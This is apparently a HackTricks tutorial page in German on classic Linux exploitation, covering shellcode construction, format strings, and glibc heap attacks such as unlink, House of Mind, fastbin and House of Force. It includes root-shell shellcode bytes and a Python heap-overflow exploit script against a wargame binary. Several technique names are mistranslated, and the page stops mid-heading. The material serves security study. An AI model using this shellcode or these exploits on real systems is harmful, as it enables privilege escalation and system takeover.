# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Kernelunterbrechungen anzeigen: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; wir setzen eax auf 0\
xor ebx, ebx ; ebx = 0, da kein Argument √ºbergeben wird\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Syscall ausf√ºhren

**nasm -f elf assembly.asm** ‚Äî> Gibt uns ein .o zur√ºck\
**ld assembly.o -o shellcodeout** ‚Äî> Gibt uns ein ausf√ºhrbares Programm, das aus dem Assemblierungscode besteht, und wir k√∂nnen die Opcodes mit **objdump** extrahieren\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um zu √ºberpr√ºfen, dass es tats√§chlich unser Shellcode ist und die OpCodes zu extrahieren

**√úberpr√ºfen, ob der Shellcode funktioniert**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Um zu sehen, dass die Systemaufrufe korrekt durchgef√ºhrt werden, muss das vorherige Programm kompiliert werden, und die Systemaufrufe sollten in **strace ./PROGRAMA\_COMPILADO** erscheinen.

Beim Erstellen von Shellcodes kann ein Trick angewendet werden. Die erste Anweisung ist ein Sprung zu einem Aufruf. Der Aufruf ruft den urspr√ºnglichen Code auf und legt au√üerdem die EIP auf den Stack. Nach der Anweisung call haben wir den ben√∂tigten String eingef√ºgt, sodass wir mit diesem EIP auf den String zeigen und au√üerdem den Code weiter ausf√ºhren k√∂nnen.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ unter Verwendung des Stacks (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Besteht aus einem kleinen Code, der die mit einem Prozess verbundenen Speicherseiten durchsucht, um die dort gespeicherte Shellcode zu finden (sucht nach einer in der Shellcode platzierten Signatur). N√ºtzlich in F√§llen, in denen nur ein kleiner Raum zum Injizieren von Code zur Verf√ºgung steht.

**Polymorphe Shellcodes**

Bestehen aus verschl√ºsselten Shells, die einen kleinen Code enthalten, der sie entschl√ºsselt und zu ihnen springt, wobei der Trick Call-Pop verwendet wird. Dies w√§re ein **verschl√ºsseltes Caesar-Beispiel**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Erg√§nzende Methoden**

**Murat-Technik**

In Linux werden alle Programme ab 0xbfffffff gemappt.

Wenn man sieht, wie der Stack eines neuen Prozesses in Linux aufgebaut wird, kann man einen Exploit entwickeln, sodass das Programm in einer Umgebung gestartet wird, deren einzige Variable der Shellcode ist. Die Adresse kann dann berechnet werden als: addr = 0xbfffffff - 4 - strlen(VOLLST√ÑNDIGER\_PROGRAMMNAME) - strlen(shellcode)

Auf diese Weise erh√§lt man einfach die Adresse, an der sich die Umgebungsvariable mit dem Shellcode befindet.

Dies ist m√∂glich, weil die Funktion execle es erlaubt, eine Umgebung zu erstellen, die nur die gew√ºnschten Umgebungsvariablen enth√§lt.

###

###

###

###

###

### **Format-Strings zu Buffer-√úberl√§ufen**

Die **sprintf**-Funktion verschiebt einen formatierten String **in** eine **Variable.** Daher k√∂nnte man die **Formatierung** eines Strings missbrauchen, um einen **Buffer-√úberlauf in der Variable** zu verursachen, in die der Inhalt kopiert wird.\
Zum Beispiel wird die Payload `%.44xAAAA` **44B+"AAAA" in die Variable schreiben**, was einen Buffer-√úberlauf verursachen kann.

### **\_\_atexit-Strukturen**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`atexit()`** ist eine Funktion, der **andere Funktionen als Parameter √ºbergeben werden.** Diese **Funktionen** werden **ausgef√ºhrt**, wenn eine **`exit()`**-Anweisung oder die **R√ºckkehr** von **main** erfolgt.\
Wenn man die **Adresse** einer dieser **Funktionen** so **modifizieren** kann, dass sie auf einen Shellcode zeigt, hat man die **Kontrolle** √ºber den **Prozess**, aber das ist derzeit komplizierter.\
Aktuell sind die **Adressen der auszuf√ºhrenden Funktionen** hinter mehreren Strukturen **versteckt**, und schlie√ülich sind die Adressen, auf die sie zeigen, nicht die Adressen der Funktionen, sondern sind **mit XOR** und Verschiebungen mit einem **zuf√§lligen Schl√ºssel** verschl√ºsselt. Daher ist dieser Angriffsvektor derzeit **nicht sehr n√ºtzlich, zumindest nicht auf x86** und **x64\_86**.\
Die **Verschl√ºsselungsfunktion** ist **`PTR_MANGLE`**. **Andere Architekturen** wie m68k, mips32, mips64, aarch64, arm, hppa... **implementieren die Verschl√ºsselungs**-Funktion nicht, da sie **das gleiche** zur√ºckgibt, was sie als Eingabe erh√§lt. Daher w√§ren diese Architekturen durch diesen Vektor angreifbar.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Heutzutage ist es sehr **seltsam, dies auszunutzen**.
{% endhint %}

**`setjmp()`** erm√∂glicht es, den **Kontext** (die Register) zu **speichern**.\
**`longjmp()`** erm√∂glicht es, den **Kontext** wiederherzustellen.\
Die **gespeicherten Register** sind: `EBX, ESI, EDI, ESP, EIP, EBP`\
Was passiert, ist, dass EIP und ESP durch die **`PTR_MANGLE`**-Funktion √ºbergeben werden, sodass die **Architekturen, die anf√§llig f√ºr diesen Angriff sind, die gleichen wie oben sind**.\
Sie sind n√ºtzlich f√ºr die Fehlerbehebung oder Unterbrechungen.\
Allerdings, soweit ich gelesen habe, sind die anderen Register nicht gesch√ºtzt, **so dass, wenn es einen `call ebx`, `call esi` oder `call edi`** innerhalb der aufgerufenen Funktion gibt, die Kontrolle √ºbernommen werden kann. Oder man k√∂nnte auch EBP modifizieren, um ESP zu √§ndern.

**VTable und VPTR in C++**

Jede Klasse hat eine **Vtable**, die ein Array von **Zeigern auf Methoden** ist.

Jedes Objekt einer **Klasse** hat einen **VPtr**, der ein **Zeiger** auf das Array seiner Klasse ist. Der VPtr ist Teil des Headers jedes Objekts, sodass, wenn eine **√úberschreibung** des **VPtr** erreicht wird, er **modifiziert** werden k√∂nnte, um auf eine Dummy-Methode zu **zeigen**, sodass die Ausf√ºhrung einer Funktion zum Shellcode f√ºhrt.

## **Pr√§ventive Ma√ünahmen und Umgehungen**

###

**Libsafe-Ersetzung**

Wird aktiviert mit: LD\_PRELOAD=/lib/libsafe.so.2\
oder\
‚Äú/lib/libsafe.so.2‚Äù > /etc/ld.so.preload

Es werden Aufrufe zu einigen unsicheren Funktionen durch sichere ersetzt. Es ist nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, keine statischen Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher und LD\_PRELOAD funktioniert nicht bei Bin√§rdateien mit suid).

**ASCII Armored Address Space**

Es besteht darin, die gemeinsam genutzten Bibliotheken von 0x00000000 bis 0x00ffffff zu laden, damit immer ein Byte 0x00 vorhanden ist. Dies stoppt jedoch tats√§chlich kaum einen Angriff, insbesondere nicht in Little Endian.

**ret2plt**

Es besteht darin, einen ROP durchzuf√ºhren, sodass die Funktion strcpy@plt (von der plt) aufgerufen wird und auf den Eintrag der GOT gezeigt wird, und das erste Byte der Funktion, die aufgerufen werden soll (system()), kopiert wird. Danach wird dasselbe gemacht, indem auf GOT+1 gezeigt wird und das 2. Byte von system() kopiert wird‚Ä¶ Am Ende wird die Adresse aufgerufen, die in GOT gespeichert ist, die system() sein wird.

**Chroot-K√§fige**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installiert ein Basissystem unter einem bestimmten Unterverzeichnis.

Ein Admin kann aus einem dieser K√§fige herauskommen, indem er Folgendes macht: mkdir foo; chroot foo; cd ..

**Code-Instrumentierung**

Valgrind ‚Äî> Sucht nach Fehlern\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap-√úberl√§ufe: Grundlegende Exploits**

**Zugewiesenes St√ºck**

prev\_size |\
size | ‚ÄîKopf\
\*mem | Daten

**Freies St√ºck**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîKopf\
\*mem | Daten

Freie St√ºcke befinden sich in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei freie St√ºcke nebeneinander existieren (sie werden zusammengef√ºhrt).

In ‚Äúsize‚Äù gibt es Bits, um anzuzeigen: Ob das vorherige St√ºck in Benutzung ist, ob das St√ºck durch mmap() zugewiesen wurde und ob das St√ºck zur prim√§ren Arena geh√∂rt.

Wenn beim Freigeben eines St√ºcks eines der benachbarten St√ºcke frei ist, werden diese durch die Macro unlink() zusammengef√ºhrt und das neue gr√∂√üere St√ºck wird an frontlink() √ºbergeben, um das geeignete bin einzuf√ºgen.

unlink(){\
BK = P->bk; ‚Äî> Der BK des neuen St√ºcks ist der, den das vorherige St√ºck hatte, das bereits frei war.\
FD = P->fd; ‚Äî> Der FD des neuen St√ºcks ist der, den das vorherige St√ºck hatte, das bereits frei war.\
FD->bk = BK; ‚Äî> Der BK des n√§chsten St√ºcks zeigt auf das neue St√ºck.\
BK->fd = FD; ‚Äî> Der FD des vorherigen St√ºcks zeigt auf das neue St√ºck.\
}

Daher, wenn es gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu modifizieren, erreicht man:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Und so wird der Shellcode beim Verlassen des Programms ausgef√ºhrt.

Au√üerdem schreibt die 4. Anweisung von unlink() etwas, und der Shellcode muss daf√ºr repariert werden:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dies verursacht das Schreiben von 4 Bytes ab dem 8. Byte des Shellcodes, sodass die erste Anweisung des Shellcodes ein jmp sein muss, um dies zu √ºberspringen und in einige nops zu gelangen, die zum Rest des Shellcodes f√ºhren.

Daher wird der Exploit erstellt:

In buffer1 f√ºgen wir den Shellcode ein, beginnend mit einem jmp, damit er in die nops oder in den Rest des Shellcodes f√§llt.

Nach dem Shellcode f√ºgen wir F√ºllmaterial ein, bis wir das Feld prev\_size und size des n√§chsten St√ºcks erreichen. An diesen Stellen f√ºgen wir 0xfffffff0 ein (so dass prev\_size √ºberschrieben wird, um das Bit zu setzen, das angibt, dass es frei ist) und ‚Äú-4‚Äú(0xfffffffc) in die size (damit, wenn √ºberpr√ºft wird, ob das 3. St√ºck tats√§chlich frei ist, es zum modifizierten prev\_size geht, das ihm sagt, dass es frei ist) -> So wird free() untersuchen und zum size des 3. St√ºcks gehen, aber tats√§chlich zum 2. - 4 und denken, dass das 2. St√ºck frei ist. Und dann wird **unlink()** aufgerufen.

Wenn unlink() aufgerufen wird, verwendet es als P->fd die ersten Daten des 2. St√ºcks, sodass dort die Adresse, die √ºberschrieben werden soll - 12 (da in FD->bk 12 zur gespeicherten Adresse in FD addiert wird) eingegeben wird. Und an dieser Adresse wird die zweite Adresse, die im 2. St√ºck gefunden wird, eingegeben, die wir m√∂chten, dass sie die Adresse zum Shellcode ist (falsches P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 Bytes F√ºllmaterial**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Es ist wichtig, dass das Bit, das angibt, dass das vorherige St√ºck frei ist, auf 1 gesetzt ist.**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, damit es denkt, dass die ‚Äúsize‚Äù des 3. St√ºcks 4 Bytes hinter (zeigt auf prev\_size) liegt, denn dort wird √ºberpr√ºft, ob das 2. St√ºck frei ist.**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Im Payload f√ºgen wir zu Beginn 8 Bytes F√ºllmaterial hinzu.**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse von free() in der plt-12 (das wird die Adresse sein, die √ºberschrieben wird, damit der Shellcode beim 2. Mal, wenn free aufgerufen wird, ausgef√ºhrt wird).**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Wie gesagt, beginnt der Payload mit 8 Bytes F√ºllmaterial, einfach so.**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Das 2. St√ºck wird modifiziert, got\_free zeigt auf die Adresse, an der wir die Adresse addr\_sc + 12 speichern werden.**

**os.system("./8.3.o " + payload)**

**unset() freigeben in umgekehrter Reihenfolge (Wargame)**

Wir kontrollieren 3 aufeinanderfolgende St√ºcke und sie werden in umgekehrter Reihenfolge zu dem, was reserviert wurde, freigegeben.

In diesem Fall:

Im St√ºck c wird der Shellcode platziert.

Das St√ºck a verwenden wir, um b so zu √ºberschreiben, dass die size das PREV\_INUSE-Bit deaktiviert hat, sodass es denkt, dass das St√ºck a frei ist.

Au√üerdem wird in der Kopfzeile b die size so √ºberschrieben, dass sie -4 betr√§gt.

Dann wird das Programm denken, dass ‚Äúa‚Äù frei ist und in einem bin ist, sodass es unlink() aufruft, um es zu entkoppeln. Wenn jedoch die Kopfzeile PREV\_SIZE -4 betr√§gt, wird es denken, dass das St√ºck ‚Äúa‚Äù tats√§chlich bei b+4 beginnt. Das hei√üt, es wird unlink() f√ºr ein St√ºck aufrufen, das bei b+4 beginnt, sodass bei b+12 der Zeiger ‚Äúfd‚Äù und bei b+16 der Zeiger ‚Äúbk‚Äù sein wird.

Auf diese Weise, wenn wir in bk die Adresse zum Shellcode und in fd die Adresse zur Funktion ‚Äúputs()‚Äù-12 setzen, haben wir unseren Payload.

**Frontlink-Technik**

Es wird Frontlink genannt, wenn etwas freigegeben wird und keines seiner benachbarten St√ºcke frei ist, es wird nicht unlink() aufgerufen, sondern direkt frontlink().

N√ºtzliche Verwundbarkeit, wenn der malloc, der angegriffen wird, niemals freigegeben wird (free()).

Ben√∂tigt:

Ein Buffer, der mit der Eingabefunktion √ºberlaufen werden kann.

Ein benachbarter Buffer, der freigegeben werden muss und dessen fd-Feld seiner Kopfzeile durch den √úberlauf des vorherigen Buffers modifiziert wird.

Ein zu freigebendes St√ºck mit einer Gr√∂√üe gr√∂√üer als 512, aber kleiner als der vorherige Buffer.

Ein Buffer, der vor Schritt 3 deklariert wird, der es erm√∂glicht, prev\_size zu √ºberschreiben.

Auf diese Weise, indem wir in zwei mallocs unkontrolliert und in einem kontrolliert √ºberschreiben, aber nur dieses eine freigeben, k√∂nnen wir einen Exploit erstellen.

**Double free()-Verwundbarkeit**

Wenn free() zweimal mit demselben Zeiger aufgerufen wird, zeigen zwei bins auf dieselbe Adresse.

Wenn man einen wiederverwenden m√∂chte, wird er problemlos zugewiesen. Wenn man einen anderen verwenden m√∂chte, wird ihm derselbe Speicher zugewiesen, sodass wir die Zeiger ‚Äúfd‚Äù und ‚Äúbk‚Äù mit den Daten, die die vorherige Zuweisung schreiben wird, f√§lschen.

**Nach free()**

Ein zuvor freigegebener Zeiger wird ohne Kontrolle erneut verwendet.

## **8 Heap-√úberl√§ufe: Fortgeschrittene Exploits**

Die Techniken Unlink() und FrontLink() wurden entfernt, als die unlink()-Funktion modifiziert wurde.

**Das Haus des Geistes**

Nur ein Aufruf von free() ist erforderlich, um die Ausf√ºhrung von beliebigem Code zu provozieren. Es ist wichtig, ein zweites St√ºck zu suchen, das durch ein vorheriges √ºberlaufen werden kann und freigegeben wird.

Ein Aufruf von free() f√ºhrt dazu, dass public\_fREe(mem) aufgerufen wird, dies macht:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mem); ‚Äî> Gibt einen Zeiger auf die Adresse zur√ºck, an der das St√ºck beginnt (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] wird das size-Feld auf das Bit NON\_MAIN\_ARENA √ºberpr√ºft, das so ver√§ndert werden kann, dass die √úberpr√ºfung true zur√ºckgibt und heap\_for\_ptr() aufgerufen wird, das ein AND auf ‚Äúmem‚Äù anwendet und die 2,5 am wenigsten signifikanten Bytes auf 0 setzt (in unserem Fall von 0x0804a000 auf 0x08000000) und auf 0x08000000->ar\_ptr zugreift (als ob es sich um eine Struktur heap\_info handelt).

Auf diese Weise, wenn wir ein St√ºck kontrollieren k√∂nnen, zum Beispiel bei 0x0804a000 und ein St√ºck bei **0x081002a0** freigegeben wird, k√∂nnen wir die Adresse 0x08100000 erreichen und schreiben, was wir wollen, zum Beispiel **0x0804a000**. Wenn dieses zweite St√ºck freigegeben wird, wird festgestellt, dass heap\_for\_ptr(ptr)->ar\_ptr das zur√ºckgibt, was wir in 0x08100000 geschrieben haben (da das AND, das wir zuvor gesehen haben, auf 0x081002a0 angewendet wird und von dort der Wert der ersten 4 Bytes, der ar\_ptr, abgeleitet wird).

Auf diese Weise wird \_int\_free(ar\_ptr, mem) aufgerufen, das hei√üt, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Wie wir zuvor gesehen haben, k√∂nnen wir den Wert von av kontrollieren, denn das ist das, was wir in das St√ºck schreiben, das freigegeben werden soll.

So wie unsorted\_chunks definiert ist, wissen wir, dass:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daher, wenn wir in av->bins\[2] den Wert von \_\_DTOR\_END\_\_-12 schreiben, wird in der letzten Anweisung in \_\_DTOR\_END\_\_ die Adresse des zweiten St√ºcks geschrieben.

Das hei√üt, im ersten St√ºck m√ºssen wir am Anfang viele Male die Adresse von \_\_DTOR\_END\_\_-12 setzen, denn von dort wird av->bins\[2] abgeleitet.

An der Adresse, an der die Adresse des zweiten St√ºcks mit den letzten 5 Nullen f√§llt, muss die Adresse dieses ersten St√ºcks geschrieben werden, damit heap\_for\_ptr() denkt, dass der ar\_ptr am Anfang des ersten St√ºcks ist und av->bins\[2] von dort abgeleitet wird.

Im zweiten St√ºck und dank des ersten √ºberschreiben wir prev\_size mit einem jump 0x0c und die size mit etwas, um -> NON\_MAIN\_ARENA zu aktivieren.

Dann setzen wir im St√ºck 2 eine Menge nops und schlie√ülich den Shellcode.

Auf diese Weise wird \_int\_free(TROZO1, TROZO2) aufgerufen und die Anweisungen befolgen, um in \_\_DTOR\_END\_\_ die Adresse von prev\_size des TROZO2 zu schreiben, die zum Shellcode springt.

Um diese Technik anzuwenden, m√ºssen einige weitere Anforderungen erf√ºllt sein, die das Payload etwas komplizierter machen.

Diese Technik ist nicht mehr anwendbar, da fast dasselbe Patch wie f√ºr unlink angewendet wurde. Es wird √ºberpr√ºft, ob die neue Adresse, auf die verwiesen wird, auch auf sie verweist.

**Fastbin**

Es ist eine Variante von The house of mind.

Es ist wichtig, den folgenden Code auszuf√ºhren, der nach der ersten √úberpr√ºfung der Funktion \_int\_free() erreicht wird.

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> wobei fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Auf diese Weise, wenn in ‚Äúfb‚Äù die Adresse einer Funktion in der GOT gesetzt wird, wird an dieser Adresse die Adresse des √ºberschriebenen St√ºcks gesetzt. Dazu muss die Arena in der N√§he der Adressen von dtors sein. Genauer gesagt, dass av->max\_fast an der Adresse ist, die wir √ºberschreiben werden.

Da wir mit The House of Mind gesehen haben, dass wir die Position von av kontrollieren konnten.

Wenn wir also im size-Feld eine Gr√∂√üe von 8 + NON\_MAIN\_ARENA + PREV\_INUSE setzen ‚Äî> gibt fastbin\_index() fastbins\[-1] zur√ºck, das auf av->max\_fast zeigt.

In diesem Fall wird av->max\_fast die Adresse sein, die √ºberschrieben wird (nicht die, auf die verwiesen wird, sondern diese Position wird √ºberschrieben).

Au√üerdem muss sichergestellt werden, dass das benachbarte St√ºck zum freigegebenen gr√∂√üer als 8 ist -> Da wir gesagt haben, dass die size des freigegebenen St√ºcks 8 ist, m√ºssen wir in diesem falschen St√ºck nur eine size gr√∂√üer als 8 setzen (da der Shellcode im freigegebenen St√ºck sein wird, muss am Anfang ein jmp gesetzt werden, der in nops f√§llt).

Au√üerdem muss dieses falsche St√ºck kleiner als av->system\_mem sein. av->system\_mem befindet sich 1848 Bytes weiter.

Wegen der Nullen von \_DTOR\_END\_ und der wenigen Adressen in der GOT sind keine Adressen dieser Abschnitte zum √úberschreiben geeignet, also schauen wir, wie wir fastbin anwenden k√∂nnen, um den Stack anzugreifen.

Eine andere Angriffsform besteht darin, **av** auf den Stack umzuleiten.

Wenn wir die size so √§ndern, dass sie 16 anstelle von 8 betr√§gt, gibt fastbin\_index() fastbins\[0] zur√ºck und wir k√∂nnen dies nutzen, um den Stack zu √ºberschreiben.

Dazu darf es keinen Canary oder seltsame Werte im Stack geben, tats√§chlich m√ºssen wir uns darin befinden: 4 Nullbytes + EBP + RET.

Die 4 Nullbytes sind erforderlich, damit **av** an dieser Adresse ist und das erste Element eines **av** der Mutex ist, der 0 sein muss.

Der **av->max\_fast** wird das EBP sein und ein Wert, der uns helfen wird, die Einschr√§nkungen zu umgehen.

In **av->fastbins\[0]** wird mit der Adresse von **p** √ºberschrieben und wird das RET sein, sodass es zum Shellcode springt.

Au√üerdem wird in **av->system\_mem** (1484 Bytes √ºber der Position im Stack) viel M√ºll sein, der uns helfen wird, die √úberpr√ºfung zu umgehen.

Au√üerdem muss sichergestellt werden, dass das benachbarte St√ºck zum freigegebenen gr√∂√üer als 8 ist -> Da wir gesagt haben, dass die size des freigegebenen St√ºcks 16 ist, m√ºssen wir in diesem falschen St√ºck nur eine size gr√∂√üer als 8 setzen (da der Shellcode im freigegebenen St√ºck sein wird, muss am Anfang ein jmp gesetzt werden, der in nops f√§llt, die nach dem size-Feld des neuen falschen St√ºcks kommen).

**Das Haus des Geistes**

In diesem Fall suchen wir einen Zeiger auf einen malloc, der vom Angreifer ver√§ndert werden kann (z.B. dass der Zeiger im Stack unter einem m√∂glichen √úberlauf auf eine Variable liegt).

So k√∂nnten wir diesen Zeiger dorthin zeigen lassen, wo wir wollen. Allerdings ist nicht jeder Ort g√ºltig, die Gr√∂√üe des gef√§lschten St√ºcks muss kleiner als av->max\_fast und spezifisch gleich der Gr√∂√üe sein, die in einem zuk√ºnftigen Aufruf von malloc()+8 angefordert wird. Daher, wenn wir wissen, dass nach diesem anf√§lligen Zeiger malloc(40) aufgerufen wird, muss die Gr√∂√üe des gef√§lschten St√ºcks gleich 48 sein.

Wenn das Programm beispielsweise den Benutzer nach einer Zahl fragt, k√∂nnten wir 48 eingeben und den ver√§nderbaren malloc-Zeiger auf die n√§chsten 4 Bytes zeigen lassen (die mit etwas Gl√ºck zum EBP geh√∂ren k√∂nnten, sodass die 48 dahinter bleibt, als w√§re es die Kopfzeile size). Au√üerdem muss die Adresse ptr-4+48 mehrere Bedingungen erf√ºllen (in diesem Fall ist ptr=EBP), das hei√üt, 8 < ptr-4+48 < av->system\_mem.

Wenn dies erf√ºllt ist, wird bei dem n√§chsten malloc, das wir gesagt haben, dass es malloc(40) ist, die Adresse des EBP zugewiesen. Wenn der Angreifer auch kontrollieren kann, was in diesem malloc geschrieben wird, kann er sowohl das EBP als auch das EIP mit der gew√ºnschten Adresse √ºberschreiben.

Ich glaube, das liegt daran, dass free() beim Freigeben speichert, dass an der Adresse, auf die der EBP im Stack zeigt, ein St√ºck mit der perfekten Gr√∂√üe f√ºr den neuen malloc() reserviert werden soll, sodass ihm diese Adresse zugewiesen wird.

**Das Haus der Kraft**

Es ist notwendig:

* Ein √úberlauf auf ein St√ºck, das das Wilderness √ºberschreiben kann.
* Ein Aufruf von malloc() mit der vom Benutzer definierten Gr√∂√üe.
* Ein Aufruf von malloc(), dessen Daten vom Benutzer definiert werden k√∂nnen.

Zuerst wird die Gr√∂√üe des Wilderness-St√ºcks mit einem sehr gro√üen Wert (0xffffffff) √ºberschrieben, sodass jede ausreichend gro√üe Speicheranforderung in \_int\_malloc() behandelt wird, ohne den Heap erweitern zu m√ºssen.

Zweitens wird av->top so ver√§ndert, dass es auf einen Speicherbereich zeigt, der unter der Kontrolle des Angreifers steht, wie den Stack. In av->top wird \&EIP - 8 gesetzt.

Wir m√ºssen av->top √ºberschreiben, damit es auf den Speicherbereich zeigt, der unter der Kontrolle des Angreifers liegt:

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Victim speichert den Wert der Adresse des aktuellen Wilderness-St√ºcks (das aktuelle av->top) und remainder ist genau die Summe dieser Adresse plus die Anzahl der Bytes, die von malloc() angefordert werden. Wenn also \&EIP-8 bei 0xbffff224 liegt und av->top 0x080c2788 enth√§lt, dann ist die Menge, die wir im kontrollierten malloc reservieren m√ºssen, damit av->top auf $EIP-8 f√ºr den n√§chsten malloc() zeigt:

0xbffff224 - 0x080c2788 = 3086207644.

So wird der ver√§nderte Wert in av->top gespeichert und der n√§chste malloc zeigt auf das EIP und kann es √ºberschreiben.

Es ist wichtig zu wissen, dass die Gr√∂√üe des neuen Wilderness-St√ºcks gr√∂√üer sein muss als die vom letzten malloc() angeforderte. Das hei√üt, wenn das Wilderness auf \&EIP-8 zeigt, wird die Gr√∂√üe genau im EBP-Feld des Stacks liegen.

**Das Haus der Legende**

**SmallBin-Korruption**

